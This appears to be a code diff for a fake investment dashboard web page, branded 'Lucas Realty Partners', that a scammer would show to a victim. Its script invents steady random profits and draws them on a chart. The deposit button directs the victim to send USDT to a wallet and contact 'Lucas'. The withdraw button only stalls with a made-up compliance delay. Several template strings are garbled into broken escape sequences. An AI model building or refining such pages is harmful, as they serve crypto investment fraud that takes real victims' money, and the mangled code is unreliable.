@@ -47,82 +47,81 @@
 
     <div id="status">Live market update • Powered by Lucas Realty Partners</div>
   </div>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
 
-  <script>
-    const STORAGE_KEY = 'vip_portfolio_state';
-    let state = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {
-      initialDeposit: 0,
-      currentBalance: 0,
-      history: [],
-      lastUpdate: Date.now(),
-      name: 'Investor'
-    };
+<script>
+  const STORAGE_KEY = 'vip_portfolio_state';
+  let state = JSON.parse(localStorage.getItem(STORAGE_KEY)) || {
+    initialDeposit: 0,
+    currentBalance: 0,
+    history: [],
+    lastUpdate: Date.now(),
+    name: 'Investor'
+  };
 
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.has('name')) state.name = urlParams.get('name');
-    if (urlParams.has('deposit') && state.initialDeposit === 0) {
-      state.initialDeposit = parseFloat(urlParams.get('deposit')) || 500;
-      state.currentBalance = state.initialDeposit;
-      state.history = [state.initialDeposit];
+  const urlParams = new URLSearchParams(window.location.search);
+  if (urlParams.has('name')) state.name = urlParams.get('name');
+  if (urlParams.has('deposit') && state.initialDeposit === 0) {
+    state.initialDeposit = parseFloat(urlParams.get('deposit')) || 500;
+    state.currentBalance = state.initialDeposit;
+    state.history = [state.initialDeposit];
+  }
+
+  document.getElementById('welcome').textContent = `Welcome back, ${state.name}`;
+
+  const ctx = document.getElementById('chartCanvas').getContext('2d');
+  const chart = new Chart(ctx, {
+    type: 'line',
+    data: { labels: [], datasets: [{ label: 'Value (USDT)', data: [], borderColor: '#00ff9d', tension: 0.35, fill: false }] },
+    options: {
+      responsive: true, scales: { y: { beginAtZero: false }, x: { display: false } },
+      plugins: { legend: { display: false } }
     }
+  });
 
-    document.getElementById('welcome').textContent = `Welcome back, ${state.name}`;
+  function simulateProfit() {
+    const now = Date.now();
+    const minutesPassed = (now - state.lastUpdate) / 60000;
 
-    const ctx = document.getElementById('chartCanvas').getContext('2d');
-    const chart = new Chart(ctx, {
-      type: 'line',
-      data: { labels: [], datasets: [{ label: 'Value (USDT)', data: [], borderColor: '#00ff9d', tension: 0.35, fill: false }] },
-      options: {
-        responsive: true, scales: { y: { beginAtZero: false }, x: { display: false } },
-        plugins: { legend: { display: false } }
-      }
-    });
+    let simulatedGain = minutesPassed * (Math.random() * 0.08 + 0.04);
+    if (simulatedGain > 12) simulatedGain = 12;
 
-    function simulateProfit() {
-      const now = Date.now();
-      const minutesPassed = (now - state.lastUpdate) / 60000;
+    const gainPct = simulatedGain / 100;
+    const oldBal = state.currentBalance;
+    state.currentBalance *= (1 + gainPct);
+    state.currentBalance = Math.round(state.currentBalance * 100) / 100;
 
-      let simulatedGain = minutesPassed * (Math.random() * 0.08 + 0.04);
-      if (simulatedGain > 12) simulatedGain = 12;
+    const dailyChange = ((state.currentBalance - oldBal) / oldBal * 100).toFixed(2);
+    document.getElementById('change').textContent = `+${dailyChange}% today`;
 
-      const gainPct = simulatedGain / 100;
-      const oldBal = state.currentBalance;
-      state.currentBalance *= (1 + gainPct);
-      state.currentBalance = Math.round(state.currentBalance * 100) / 100;
+    state.history.push(state.currentBalance);
+    if (state.history.length > 30) state.history.shift();
 
-      const dailyChange = ((state.currentBalance - oldBal) / oldBal * 100).toFixed(2);
-      document.getElementById('change').textContent = `+${dailyChange}% today`;
+    chart.data.labels = state.history.map((_, i) => i);
+    chart.data.datasets[0].data = state.history;
+    chart.update();
 
-      state.history.push(state.currentBalance);
-      if (state.history.length > 30) state.history.shift();
+    const log = document.getElementById('log');
+    const entry = document.createElement('div');
+    entry.className = 'entry';
+    entry.textContent = `[\( {new Date().toLocaleTimeString()}] Portfolio yield + \){(gainPct*100).toFixed(2)}% • New value: \[ {state.currentBalance.toFixed(2)}`;
+    log.prepend(entry);
+    if (log.children.length > 8) log.removeChild(log.lastChild);
 
-      chart.data.labels = state.history.map((_, i) => i);
-      chart.data.datasets[0].data = state.history;
-      chart.update();
+    state.lastUpdate = now;
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
 
-      const log = document.getElementById('log');
-      const entry = document.createElement('div');
-      entry.className = 'entry';
-      entry.textContent = `[\( {new Date().toLocaleTimeString()}] Portfolio yield + \){(gainPct*100).toFixed(2)}% • New value: \[ {state.currentBalance.toFixed(2)}`;
-      log.prepend(entry);
-      if (log.children.length > 8) log.removeChild(log.lastChild);
+    document.getElementById('balance').textContent = ` \]{state.currentBalance.toFixed(2)}`;
+  }
 
-      state.lastUpdate = now;
-      localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
+  simulateProfit();
+  setInterval(simulateProfit, Math.random() * 12000 + 6000);
 
-      document.getElementById('balance').textContent = ` \]{state.currentBalance.toFixed(2)}`;
-    }
+  document.getElementById('depositBtn').onclick = () => {
+    alert("Send USDT-TRC20 to this address to top up:\nTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n(Contact Lucas for confirmation ❤️)");
+  };
 
-    simulateProfit();
-    setInterval(simulateProfit, Math.random() * 12000 + 6000);
-
-    document.getElementById('depositBtn').onclick = () => {
-      alert("Send USDT-TRC20 to this address to top up:\nTxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n(Contact Lucas for confirmation ❤️)");
-    };
-
-    document.getElementById('withdrawBtn').onclick = () => {
-      alert("Withdrawal request submitted.\nDue to current compliance review, processing may take 48–72 hours.\nWe'll notify you the moment funds are released.");
-    };
-  </script>
-</body>
-</html>
+  document.getElementById('withdrawBtn').onclick = () => {
+    alert("Withdrawal request submitted.\nDue to current compliance review, processing may take 48–72 hours.\nWe'll notify you the moment funds are released.");
+  };
+</script>
